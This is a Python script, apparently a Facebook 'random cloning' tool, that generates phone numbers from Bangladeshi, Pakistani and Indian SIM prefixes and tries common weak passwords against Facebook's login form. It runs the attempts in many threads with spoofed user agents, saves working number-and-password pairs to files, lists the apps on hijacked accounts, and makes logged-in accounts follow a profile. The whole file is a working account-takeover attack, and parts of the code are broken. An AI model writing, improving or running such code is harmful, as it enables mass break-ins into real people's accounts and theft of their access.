#---------------------[IMPORT]---------------------#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit

###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python MAMUN-XD.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '{RED}'
H = '{GREEN}'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' # PUTIH
G = '{GREEN}' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
HBF = '{ HBF }'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
import random
cokbrut=[]
ses=requests.Session()
princp=[]
twf =[]
user=[]
ugen=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    ugen.append(xx)

loop = 0
cp = []
ok = []
twf = []

ugen = []
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM ')
    
prox=open('.prox.txt','r').read().splitlines()


for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('user-agents.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://gist.github.com/pzb/b4b6f57144aea7827ae4').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n') 
        ua=open('.user-agents.txt','r').read().splitlines()

loop = 0
cp = []
ok = []
twf = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

logo ="""  \x1b[1;97m
   _____ _______      ________     __          __ __     __
\033[1;35m  / ____|_   _\ \    / /  ____|   /\ \        / /\\ \   / /
 | |  __  | |  \ \  / /| |__     /  \ \  /\  / /  \\ \_/ / 
 \033[1;33m| | |_ | | |   \ \/ / |  __|   / /\ \ \/  \/ / /\ \\   /  
 | |__| |_| |_   \  /  | |____ / ____ \  /\  / ____ \| |   
 \033[1;31m \_____|_____|   \/   |______/_/    \_\/  \/_/    \_\_|                                                                                                                                                                                
\x1b[1;92m┏───────────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mM A M U N     
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mDAVID MAMUN WILLIAM                
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+880130406886               
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mBD+PAK+IND RANDOM CLONING 
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mMAMUN-404-CYBER         
\x1b[1;92m┗───────────────────────────────────────────────┛
\033[1;93m─────────────────────────────────────────────────────
\x1b[1;95m             GIFTED BY MAMUN \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;35m ENJOY ALL
\033[1;93m─────────────────────────────────────────────────────  """
clear()
os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
xxxx = str(len(ugen))
print('\033[1;93m─────────────────────────────────────────────────────') 
print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
print('\033[1;93m─────────────────────────────────────────────────────') 
NameX =input('\033[1;97m[+]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \033[1;96m')
#---------------------[LOOP MENU]---------------------#
loop = 0
cp = []
ok = []
twf = []
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            #created by hbf team(owners) Adi & Hamii
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;97m====================================================') 
def follow(ses,coki):
    ses.headers.update({"accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

#---------------------[MAIN MENU]---------------------#
def MAMUN():
    clear()
    os.getuid
    os.system("clear");print(logo)
    clear()
    print (' \t           \033[1;37m[ \033[1;32mMAIN MENU \033[1;37m]')
    print('\033[1;93m─────────────────────────────────────────────────────') 
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;93m─────────────────────────────────────────────────────') 
    print(f"\033[1;97m[+] \033[1;92mUSERNAME \033[1;91m: \033[1;96m{NameX}")
    print('\033[1;93m─────────────────────────────────────────────────────') 
    print(f"\033[1;97m[01] \033[1;92mRANDOM CLONE ")
    print(f"\033[1;97m[02] \033[1;92mFOLLOW ME ON FACEBOOK")
    print(f"\033[1;97m[00] \033[1;92mEXIT ")
    print('\033[1;93m─────────────────────────────────────────────────────') 
    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m CHOOSE \033[1;37m: \033[1;36m")
    if adi in ["1","01"]:
        passx()
    elif adi in ["2","02"]:
        os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
        main()
    elif adi in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        main()

def passx():
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;93m─────────────────────────────────────────────────────') 
    print('              \x1b[97m\033[37;41m[ PASSWORD METHOD ]\033[0;m ')
    print('\033[1;93m─────────────────────────────────────────────────────') 
    print("\033[1;97m[01] \033[1;92mMETHOD 1")
    print("\033[1;97m[02] \033[1;92mMETHOD 2")
    print("\033[1;97m[03] \033[1;92mMETHOD 3")
    print("\033[1;97m[04] \033[1;92mMETHOD 4")
    print("\033[1;97m[05] \033[1;92mMETHOD 5")
    print("\033[1;97m[06] \033[1;92mMETHOD 6")
    print("\033[1;97m[06] \033[1;92mMETHOD 7")
    print("\033[1;97m[06] \033[1;92mMETHOD 8")
    print('\033[1;93m─────────────────────────────────────────────────────') 
    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m CHOOSE \033[1;37m: \033[1;36m")
    if adi in ["1","01"]:
        pass1()
    elif adi in ["2","02"]:
        pass2()
    else:
        print('\033[1;31mINCORECT OPTION!\3[1;31m')
        passx()

def pass1():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;93m─────────────────────────────────────────────────────')
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE ]\033[0;m")
    print('\033[1;93m─────────────────────────────────────────────────────')
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;93m─────────────────────────────────────────────────────')
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m CHOOSE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;93m─────────────────────────────────────────────────────')
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 5000\n\033[1;93m───────────────────────────────────────────────────── \n\033[1;97m[+]\033[1;92m CHOOSE \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;93m─────────────────────────────────────────────────────')
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m METHOD\033[1;91m                   : \033[1;96m7') 
        print('\033[1;97m[+]\033[1;93m IF YOU NO RESULTS ON/OFF AIRPLANE MODE')
        print('\033[1;93m─────────────────────────────────────────────────────')
        for love in user:
            uid = code+love
            pwx = [love,'BANGLADESH','Bangladesh','bangladesh','FREEFIRE','FREE FIRE','Freefire','Free fire','freefire','free fire','I Love You',]
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;93m─────────────────────────────────────────────────────')
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;93m─────────────────────────────────────────────────────')
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    
def pass2():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;93m─────────────────────────────────────────────────────')
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE ]\033[0;m")
    print('\033[1;93m─────────────────────────────────────────────────────')
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;93m─────────────────────────────────────────────────────')
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m CHOOSE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;93m─────────────────────────────────────────────────────')
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 5000\n\033[1;93m───────────────────────────────────────────────────── \n\033[1;97m[+]\033[1;92m CHOOSE \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;93m─────────────────────────────────────────────────────')
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m METHOD\033[1;91m                   : \033[1;96m8') 
        print('\033[1;97m[+]\033[1;93m IF YOU NO RESULTS ON/OFF AIRPLANE MODE')
        print('\033[1;93m─────────────────────────────────────────────────────')
        for love in user:
            uid = code+love
            pwx = [love,'Condom','Tisha123','Najmin123','Barovatari123,Fuck You123,Bd King','Free Fire',]
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;93m─────────────────────────────────────────────────────')
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;93m─────────────────────────────────────────────────────')
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def freeq(uid,pwx,tl):
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "next":"https://m.basic.facebook.com/login/device-based/regular/login/?refsrc",
            "flow":"login_no_pain",
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'GET',
            "path": '/?tbua=1',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            "referer": 'https://m.facebook.com/',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro,}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mXD-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mXD-CP\033[1;97m]\033[1;91m '+cid+' | '+ps+' ')
                    open('/sdcard/CP.txt', 'a').write(cid+' | '+ps+'\n')
                    cp.append(cid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[\x1b[1;92mMAMUN-XD\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m]  \x1b[1;97m[\x1b[1;92mOK: %s\x1b[1;97m] \x1b[1;97m[\x1b[1;91mCP: %s\x1b[1;97m]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    MAMUN()